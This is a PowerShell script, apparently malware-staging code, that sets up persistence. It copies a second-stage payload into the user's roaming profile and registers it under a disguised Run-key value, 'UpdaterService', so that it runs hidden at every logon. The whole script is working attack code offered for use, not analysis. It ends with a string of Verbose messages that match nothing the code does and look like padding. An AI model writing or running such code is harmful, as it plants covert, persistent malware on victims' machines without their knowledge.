<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'UpdaterService',
    [string]$PersistencePath = "$env:APPDATA\stage2.ps1",
    [string]$LogPath = "$env:TEMP\transfer.log"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    [CmdletBinding()]
    param(
        [string]$SourcePath = "",
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    [CmdletBinding()]
    param(
        [string]$KeyPath = "",
        [string]$ValueName = "",
        [string]$TargetPath = ''
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -File "' + $TargetPath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName -ErrorAction SilentlyContinue)
}

try {
    Write-StageLog -Message "Starting persistence stage"
    $InstallResult = Install-StagePayload -SourcePath 'C:\ProgramData\stage1.bin' -DestinationPath $PersistencePath
    if ($InstallResult) {
        $StageResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
        Write-StageLog -Message "Run key written"
    }
    else {
        Write-Warning "Payload copy did not complete"
    }
}
catch {
    Write-Warning "Persistence workflow failed: $($_.Exception.Message)"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Operation completed"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Resolving configured target"
Write-Verbose "Reading configuration values"
Write-Verbose "Writing diagnostic marker"
Start-Sleep -Seconds 43
